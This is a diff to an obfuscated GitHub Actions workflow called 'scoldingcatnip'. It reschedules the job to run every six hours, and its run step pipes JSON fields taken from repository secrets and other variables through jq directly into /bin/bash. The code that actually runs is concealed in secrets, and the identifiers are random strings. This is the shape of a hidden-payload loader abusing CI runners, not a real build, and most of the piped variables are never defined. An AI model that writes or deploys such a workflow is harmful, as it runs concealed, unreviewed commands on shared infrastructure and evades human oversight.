@@ -3,7 +3,7 @@ name: scoldingcatnip
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 5/6 * * *'
+    - cron: '12 2/6 * * *'
 
 jobs:
   build:
@@ -12,15 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: scoldingcatnip
         env:
-          tnbsi21: ${{ secrets.tnbsi21 }}
+          f73: ${{ secrets.f73 }}
         run: |
-          echo $tnbsi21 | jq -r .m3 | /bin/bash
-          echo $a9311 | jq -r .if5372 | /bin/bash
-          echo $qd7 | jq -r .pyop183 | /bin/bash
-          echo $a7 | jq -r .cwksg3840 | /bin/bash
-          echo $jj563 | jq -r .odlk38 | /bin/bash
-          echo $rnfcx4 | jq -r .zyxm48112 | /bin/bash
-          echo $p0840 | jq -r .h5161 | /bin/bash
-          echo $av7153 | jq -r .tw799 | /bin/bash
-          echo $hfme279 | jq -r .oak47951 | /bin/bash
+          echo $f73 | jq -r .gr91 | /bin/bash
+          echo $kjkz972 | jq -r .npb0124 | /bin/bash
+          echo $q43 | jq -r .euj0421 | /bin/bash
+          echo $wtg88723 | jq -r .kzszl686 | /bin/bash
+          echo $s76 | jq -r .joh325 | /bin/bash
+          echo $vcs62899 | jq -r .tnpy2925 | /bin/bash
 
